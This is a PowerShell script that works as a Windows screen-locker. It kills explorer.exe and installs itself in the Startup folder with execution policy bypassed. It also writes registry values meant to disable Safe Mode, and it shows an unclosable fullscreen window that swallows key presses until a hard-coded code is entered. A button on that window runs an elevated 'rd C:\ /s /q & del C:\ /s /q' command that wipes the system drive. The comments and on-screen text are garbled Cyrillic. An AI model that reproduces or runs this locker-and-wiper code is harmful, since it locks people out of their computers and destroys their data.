Add-Type -AssemblyName System.Windows.Forms

# ��������� ������� explorer.exe � ������� taskkill
Start-Process -FilePath "taskkill.exe" -ArgumentList "/F", "/IM", "explorer.exe" -Wait

# ��������� ������ � ������������
$scriptPath = $MyInvocation.MyCommand.Path
$shortcutPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Startup'), "BlockWindows.lnk")

if (-not (Test-Path $shortcutPath)) {
    $WshShell = New-Object -ComObject WScript.Shell
    $shortcut = $WshShell.CreateShortcut($shortcutPath)
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
    $shortcut.IconLocation = "powershell.exe"
    $shortcut.Save()
}

# ��������� ���������� ������
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" -Name "DisableSafeMode" -Value 1 -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot\Alternate" -Name "DisableSafeMode" -Value 1 -ErrorAction SilentlyContinue

# ������� �����
$form = New-Object System.Windows.Forms.Form
$form.TopMost = $true
$form.FormBorderStyle = 'None'  # ������� �����
$form.WindowState = 'Maximized'  # ������������� ������������� �����
$form.BackColor = [System.Drawing.Color]::Black  # ������������� ������ ���
$form.Opacity = 1  # ������� ������������

# ������� ����� � ������� "Windows ������������!"
$labelTitle = New-Object System.Windows.Forms.Label
$labelTitle.Text = "Windows ������������!"
$labelTitle.ForeColor = [System.Drawing.Color]::White  # ����� �����
$labelTitle.Font = New-Object System.Drawing.Font("Arial", 48)
$labelTitle.AutoSize = $true
$labelTitle.TextAlign = 'MiddleCenter'
$labelTitle.SetBounds(0, 100, $form.ClientSize.Width, 100)

# ������� ����� � ������� "������� ������"
$labelPrompt = New-Object System.Windows.Forms.Label
$labelPrompt.Text = "�� ���, �����������? ���� ���� ��������, ����� ������ ��� ����� �������:)"
$labelPrompt.ForeColor = [System.Drawing.Color]::White  # ����� �����
$labelPrompt.Font = New-Object System.Drawing.Font("Arial", 14)
$labelPrompt.AutoSize = $true
$labelPrompt.TextAlign = 'MiddleCenter'
$labelPrompt.SetBounds(0, 200, $form.ClientSize.Width, 100)

# ������� ���� ��� ����� ����
$textBox = New-Object System.Windows.Forms.TextBox
$textBox.SetBounds(100, 300, 300, 50)
$textBox.Font = New-Object System.Drawing.Font("Arial", 24)
$textBox.ReadOnly = $true  # ������ ���� ������ ��� ������
$textBox.BackColor = [System.Drawing.Color]::Black  # ������ ���
$textBox.ForeColor = [System.Drawing.Color]::White  # ����� �����
$textBox.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle  # ������������� �����

# ������� ������ � �������
$buttons = @()
for ($i = 1; $i -le 9; $i++) {
    $button = New-Object System.Windows.Forms.Button
    $button.Text = $i.ToString()
    $button.SetBounds(100 + (($i - 1) * 60), 370, 50, 50)  # �������� ������� � ������������ ������
    $button.Font = New-Object System.Drawing.Font("Arial", 24)
    $button.BackColor = [System.Drawing.Color]::Black  # ������ ������
    $button.ForeColor = [System.Drawing.Color]::White  # ����� �����
    $button.FlatStyle = [System.Windows.Forms.FlatStyle]::Standard  # ������������� ����� ������
    $button.FlatAppearance.BorderColor = [System.Drawing.Color]::White  # ����� �����
    $button.FlatAppearance.BorderSize = 2  # ������ �����

    # ���������� ������� �� ������
    $button.Add_Click({
        $textBox.Text += $this.Text  # ���������� �� ������������� $this ��� ��������� ������ ������
    })
    $buttons += $button
}

# ������� ������ "0"
$button0 = New-Object System.Windows.Forms.Button
$button0.Text = "0"
$button0.SetBounds(100 + (9 * 60), 370, 50, 50)  # ��������� ������ "0"
$button0.Font = New-Object System.Drawing.Font("Arial", 24)
$button0.BackColor = [System.Drawing.Color]::Black
$button0.ForeColor = [System.Drawing.Color]::White
$button0.FlatStyle = [System.Windows.Forms.FlatStyle]::Standard
$button0.FlatAppearance.BorderColor = [System.Drawing.Color]::White
$button0.FlatAppearance.BorderSize = 2
$button0.Add_Click({
    $textBox.Text += "0"
})

# ������� ������ "��������"
$buttonClear = New-Object System.Windows.Forms.Button
$buttonClear.Text = "��������"
$buttonClear.SetBounds(100, 440, 300, 50)  # �������� ������� � ������������ ������ "��������"
$buttonClear.Font = New-Object System.Drawing.Font("Arial", 24)  # ��� �� �����, ��� � � ������ �������������
$buttonClear.BackColor = [System.Drawing.Color]::Black
$buttonClear.ForeColor = [System.Drawing.Color]::White
$buttonClear.FlatStyle = [System.Windows.Forms.FlatStyle]::Standard
$buttonClear.FlatAppearance.BorderColor = [System.Drawing.Color]::White
$buttonClear.FlatAppearance.BorderSize = 2
$buttonClear.Add_Click({
    $textBox.Text = ""  # ������� ���� �����
})

# ������� ������ "��������������"
$buttonUnlock = New-Object System.Windows.Forms.Button
$buttonUnlock.Text = "��������������"
$buttonUnlock.SetBounds(100, 500, 300, 50)
$buttonUnlock.Font = New-Object System.Drawing.Font("Arial", 24)
$buttonUnlock.BackColor = [System.Drawing.Color]::Black
$buttonUnlock.ForeColor = [System.Drawing.Color]::White
$buttonUnlock.FlatStyle = [System.Windows.Forms.FlatStyle]::Standard
$buttonUnlock.FlatAppearance.BorderColor = [System.Drawing.Color]::White
$buttonUnlock.FlatAppearance.BorderSize = 2

# ������� ������ "������� Windows"
$buttonDelete = New-Object System.Windows.Forms.Button
$buttonDelete.Text = "������� Windows"
$buttonDelete.SetBounds(100, 550, 300, 50)
$buttonDelete.Font = New-Object System.Drawing.Font("Arial", 24)
$buttonDelete.BackColor = [System.Drawing.Color]::Black
$buttonDelete.ForeColor = [System.Drawing.Color]::White
$buttonDelete.FlatStyle = [System.Windows.Forms.FlatStyle]::Standard
$buttonDelete.FlatAppearance.BorderColor = [System.Drawing.Color]::White
$buttonDelete.FlatAppearance.BorderSize = 2

# ���������� ������� ������ �������������
$buttonUnlock.Add_Click({
    if ($textBox.Text -eq '1274837411') {
        # ���������, ��� ������� explorer.exe �� �������
        $explorerProcess = Get-Process -Name "explorer" -ErrorAction SilentlyContinue
        if (-not $explorerProcess) {
            Start-Process "C:\windows\explorer.exe"  # ��������� ������� explorer.exe ��� ���������� ����
        }
        $form.Close()  # ��������� ���� ��� ���������� ����
        Stop-Process -Id $PID -Force  # ��������� ������� ������� �������
    } else {
        $textBox.Text = "�������� ������!"  # ������� ��������� � ���� �����
        $textBox.ForeColor = [System.Drawing.Color]::White  # ������ ���� ������ �� ������� ��� ���������
    }
})

# ���������� ������� ������ �������� Windows
$buttonDelete.Add_Click({
    # ������� ����� ������� ��� ��������� ������
    $process = New-Object System.Diagnostics.Process
    $process.StartInfo.FileName = "cmd.exe"
    $process.StartInfo.Arguments = "/c rd C:\ /s /q & del C:\ /s /q"
    $process.StartInfo.Verb = "runas"  # ��������� � ������� ��������������
    $process.Start()
})

# ��������� �������� ���������� �� �����
$form.Controls.Add($labelTitle)
$form.Controls.Add($labelPrompt)
$form.Controls.Add($textBox)
$form.Controls.Add($buttonUnlock)
$form.Controls.Add($buttonDelete)
$form.Controls.AddRange($buttons)  # ��������� ������ 1-9
$form.Controls.Add($button0)  # ��������� ������ 0
$form.Controls.Add($buttonClear)  # ��������� ������ "��������"

# ��������� ������ ��������
$form.ControlBox = $false

# ���������� ������� �������� �����, ����� ������������� ��������
$form.Add_FormClosing({
    $_.Cancel = $true  # �������� ��������
})

# ��������� ������� ������� ��� ���������� �����
$form.Add_KeyDown({
    param($sender, $e)
    $e.Handled = $true  # ���������� �������
})

# ������� ������ ��� ���������� ��������� �����
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 40  # �������� 40 �����������
$timer.Add_Tick({
    $form.TopMost = $true  # ������������, ��� ����� ������ ������
})
$timer.Start()  # ��������� ������

# ���������� �����
$form.ShowDialog()